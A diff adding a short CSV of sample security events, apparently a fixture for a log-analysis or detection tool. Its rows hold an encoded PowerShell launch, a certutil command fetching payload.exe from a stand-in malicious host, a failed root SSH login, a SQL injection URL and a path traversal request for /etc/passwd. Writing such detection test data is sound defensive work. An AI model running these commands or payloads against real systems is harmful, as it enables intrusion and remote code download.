@@ -1,0 +1,6 @@
+timestamp,source,event_type,user,src_ip,process_name,command_line,url,status,message
+2026-05-16 10:20:11,windows,process_creation,Aayushi,192.168.1.5,powershell.exe,"powershell.exe -enc aQBlAHg=",,
+2026-05-16 10:22:11,windows,process_creation,Aayushi,192.168.1.5,certutil.exe,"certutil.exe -urlcache -f http://malicious.com/payload.exe payload.exe",,
+2026-05-16 10:25:09,linux,auth,root,45.33.21.10,,,,,"Failed password for root from 45.33.21.10 port 22 ssh2"
+2026-05-16 10:26:30,web,http,,103.22.44.12,,,"/login.php?id=1' OR '1'='1",500,
+2026-05-16 10:27:15,web,http,,103.22.44.12,,,"/../../etc/passwd",404,
